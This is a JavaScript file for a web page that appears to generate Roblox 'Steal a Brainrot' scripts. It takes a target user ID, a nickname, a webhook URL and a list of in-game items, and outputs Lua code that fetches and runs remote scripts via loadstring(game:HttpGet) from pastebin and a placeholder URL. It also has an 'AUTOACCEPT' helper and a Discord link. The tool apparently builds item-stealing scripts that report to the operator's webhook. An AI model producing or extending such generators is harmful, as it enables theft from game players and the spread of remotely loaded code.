// ВСЕ БРЕЙНРОТЫ
const allBrainrots = [
    "Meowl", "Strawberry Elephant", "Headless Horseman", "Skibidi Toilet",
    "Griffin", "Hydra Dragon Cannelloni", "Dragon Gingerini", "Dragon Cannelloni",
    "Love Love Bear", "La Supreme Combinasion", "Celestial Pegasus", "Cerberus",
    "Popcuru and Fizzuru", "Rosey and Teddy", "Capitano Moby", "Cooki and Milki",
    "Burguro And Fryuro", "Ketupat Bros", "Reinito Sleighito", "Fortunu and Cashuru",
    "Los Amigos", "La Secret Combinasion", "Los Sekolahs", "Signore Carapace",
    "La Casa Boo", "Fragrama and Chocrama", "La Food Combinasion", "Elefanto Frigo",
    "Spooky and Pumpky", "Ginger Gerat", "La Ginger Sekolah", "Sammyni Fattini",
    "Los Spaghettis", "Festive 67", "Ventoliero Pavonero", "Cloverat Clapat",
    "Spaghetti Tualetti", "Antonio", "Rosetti Tualetti", "Nacho Spyder",
    "Garama and Madundung", "Fishino Clownino", "Gold Gold Gold", "Jolly Jolly Sahur",
    "Lavadorito Spinito", "Ketchuru and Musturu", "Tirilikalika Tirilikalako",
    "Swaggy Bros", "La Romantic Grande", "Orcaledon", "Tictac Sahur",
    "La Taco Combinasion", "Ketupat Kepat", "Dug dug dug", "Tang Tang Keletang",
    "Lovin Rose", "Los Tacoritas", "Eviledon", "Los Primos", "W or L", "Esok Sekolah",
    "La Jolly Grande", "Los Cupids", "Los Puggies", "Tralaledon", "Gobblino Uniciclino",
    "Tuff Toucan", "Mieteteira Bicicleteira", "Chipso and Queso", "Chillin Chili",
    "Money Money Reindeer", "La Spooky Grande", "Bacuru and Egguru", "Los Bros",
    "La Extinct Grande", "Los Candies", "Los 67", "Celularcini Viciosini", "Los Mobilis",
    "Money Money Puggy", "Cigno Fulgoro", "Los Spooky Combinasionas", "Los Hotspotsitos",
    "Los Jolly Combinasionas", "Snailo Clovero", "Los Planitos", "Chicleteira Cupideira",
    "DJ Panda", "Las Sis", "Spinny Hammy", "Tacorita Bicicleta", "Los Sweethearts",
    "Nuclearo Dinossauro", "Chicleteira Noelteira", "Los Combinasionas", "Chimnino",
    "Noo my Gold", "Swag Soda", "Noo my Heart", "Tacorillo Crocodillo", "Mariachi Corazoni",
    "La Grande Combinasion", "Los 25", "Los Burritos", "67", "Donkeyturbo Express",
    "Los Chicleteiras", "Guest 666", "Los Mi Gatitos", "Rang Ring Bus", "Granny",
    "Noo my Present", "Serafinna Medusella", "Los Nooo My Hotspotsitos", "Arcadopus",
    "Noo my Candy", "Los Quesadillas", "Chicleteirina Bicicleteirina", "Chill Puppy",
    "Burrito Bandito", "Luck Luck Luck Sahur", "Chicleteira Bicicleteira", "Brunito Marsito",
    "Quesadillo Vampiro", "Eid Eid Eid Sahur", "Cupid Hotspot", "Mi Gatito",
    "Ho Ho Ho Sahur", "Cupid Cupid Sahur", "Pot Pumpkin", "Naughty Naughty",
    "Bunito Bunito Spinito", "Quesadilla Crocodila", "Horegini Boom", "Santa Hotspot",
    "Pot Hotspot", "25", "Pirulitoita Bicicleteira", "To to to Sahur", "Telemorte",
    "La Sahur Combinasion", "List List List Sahur", "Noo my examine", "Los Jobcitos",
    "Nooo My Hotspot", "Bunnyman", "Tung Tung Tung Sahur", "Cuadramat and Pakrahmatmamat",
    "Please my Present", "Los Cucarachas", "1x1x1x1", "La Vacca Lepre Lepreino",
    "Love Love Love Sahur", "Perrito Burrito", "Graipuss Medussi", "Giftini Spyderini",
    "GOAT", "Trickolino", "Paradiso Axolottino", "Triplito Tralaleritos",
    "La Vacca Jacko Linterino", "Fishboard", "Santteo", "Las Vaquitas Saturnitas",
    "Los Karkeritos", "Karker Sahur", "Los Trios", "Job Job Job Sahur", "Frankentteo",
    "Pumpkini Spyderini", "Las Tralaleritas", "Rocco Disco", "Extinct Matteo",
    "La Karkerkar Combinasion", "La Vacca Prese Presente", "Reindeer Tralala",
    "Yess my examine", "Guerriro Digitale", "Boatito Auratito", "Vulturino Skeletono",
    "Los Tralaleritos", "Zombie Tralala", "Los Tortus", "La Cucaracha", "Fragola La La La",
    "Extinct Tralalero", "Agarrini la Palini", "Los Spyderinis", "Chachechi",
    "Blackhole Goat", "Dul Dul Dul", "Torrtuginni Dragonfrutini", "Trenostruzzo Turbo 4000",
    "Karkerkar Kurkur", "Los Matteos", "Bisonte Giuppitere", "Sammyni Spyderini",
    "La Vacca Saturno Saturnita", "Jackorilla", "Secret Lucky Block"
];

function populateBrainrotsList() {
    const container = document.getElementById('brainrotsList');
    if (!container) return;
    container.innerHTML = '';
    allBrainrots.forEach(br => {
        const label = document.createElement('label');
        label.className = 'checkbox-item';
        const cb = document.createElement('input');
        cb.type = 'checkbox';
        cb.value = br;
        const span = document.createElement('span');
        span.textContent = br;
        label.appendChild(cb);
        label.appendChild(span);
        container.appendChild(label);
    });
}

const searchInput = document.getElementById('searchBrainrots');
if (searchInput) {
    searchInput.addEventListener('input', (e) => {
        const term = e.target.value.toLowerCase();
        document.querySelectorAll('.checkbox-item').forEach(item => {
            const text = item.querySelector('span').textContent.toLowerCase();
            item.style.display = text.includes(term) ? 'flex' : 'none';
        });
    });
}

const selectAllBtn = document.getElementById('selectAllBtn');
if (selectAllBtn) {
    selectAllBtn.onclick = () => {
        document.querySelectorAll('#brainrotsList input').forEach(cb => cb.checked = true);
    };
}

const deselectAllBtn = document.getElementById('deselectAllBtn');
if (deselectAllBtn) {
    deselectAllBtn.onclick = () => {
        document.querySelectorAll('#brainrotsList input').forEach(cb => cb.checked = false);
    };
}

document.querySelectorAll('input[name="scriptType"]').forEach(radio => {
    radio.addEventListener('change', () => {
        const customArea = document.getElementById('customScript');
        if (customArea) {
            customArea.style.display = radio.value === 'custom' ? 'block' : 'none';
        }
    });
});

const generateBtn = document.getElementById('generateBtn');
if (generateBtn) {
    generateBtn.addEventListener('click', () => {
        const nick = document.getElementById('robloxNick')?.value.trim() || "";
        const userId = document.getElementById('robloxId')?.value.trim() || "";
        const webhook = document.getElementById('webhookUrl')?.value.trim() || "";
        const scriptType = document.querySelector('input[name="scriptType"]:checked')?.value || "none";
        const customScript = document.getElementById('customScript')?.value || "";

        const selected = [];
        document.querySelectorAll('#brainrotsList input:checked').forEach(cb => {
            selected.push(cb.value);
        });

        if (selected.length === 0) {
            alert('Select at least one brainrot');
            return;
        }
        if (!webhook) {
            alert('Enter Webhook URL');
            return;
        }

        let extraScript = '';
        if (scriptType === '22s') {
            extraScript = 'loadstring(game:HttpGet("https://pastebin.com/raw/vyRfjXm0"))()';
        } else if (scriptType === 'custom') {
            extraScript = customScript;
        }

        const brainrotListStr = "{\n    " + selected.map(br => `"${br}"`).join(",\n    ") + "\n}";

        const finalScript = `-- ========== CONFIG ==========
local CONFIG = {
    TARGET_USER_ID = "${userId}",
    TARGET_NAME = "${nick}",
    WEBHOOK_URL = "${webhook}",
    TARGET_BRAINROTS = ${brainrotListStr},
    EXTRA_SCRIPT = [[${extraScript}]]
}
-- ========== END CONFIG ==========

-- Load main script
loadstring(game:HttpGet("YOUR_MAIN_SCRIPT_URL"))()

-- Load extra script if exists
if CONFIG.EXTRA_SCRIPT and CONFIG.EXTRA_SCRIPT ~= "" then
    loadstring(CONFIG.EXTRA_SCRIPT)()
end`;

        const outputDiv = document.getElementById('output');
        const scriptOutput = document.getElementById('scriptOutput');
        const copyBtn = document.getElementById('copyBtn');
        if (outputDiv) outputDiv.style.display = 'block';
        if (scriptOutput) scriptOutput.textContent = finalScript;
        if (copyBtn) copyBtn.style.display = 'inline-flex';
    });
}

const copyBtn = document.getElementById('copyBtn');
if (copyBtn) {
    copyBtn.addEventListener('click', () => {
        const text = document.getElementById('scriptOutput')?.textContent || "";
        navigator.clipboard.writeText(text);
        alert('Copied to clipboard!');
    });
}

const discordBtn = document.getElementById('discordBtn');
if (discordBtn) {
    discordBtn.addEventListener('click', () => {
        window.open('https://discord.gg/9A6x27c9k6', '_blank');
    });
}

const autoacceptBtn = document.getElementById('autoacceptBtn');
if (autoacceptBtn) {
    autoacceptBtn.addEventListener('click', () => {
        navigator.clipboard.writeText("AUTOACCEPT");
        alert('AUTOACCEPT copied to clipboard!');
    });
}

populateBrainrotsList();
